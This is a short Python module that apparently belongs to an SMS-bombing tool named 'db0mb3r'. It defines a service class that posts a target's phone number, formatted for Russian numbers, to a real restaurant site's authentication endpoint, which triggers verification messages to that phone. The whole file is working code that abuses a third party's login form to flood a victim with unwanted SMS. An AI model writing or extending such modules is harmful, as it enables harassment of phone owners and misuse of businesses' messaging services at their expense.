from db0mb3r.services.service import Service


class SushiGourmet(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "http://sushigourmet.ru/auth",
            data={"phone": self.format(self.phone, "8 (***) ***-**-**"), "stage": 1},
        )
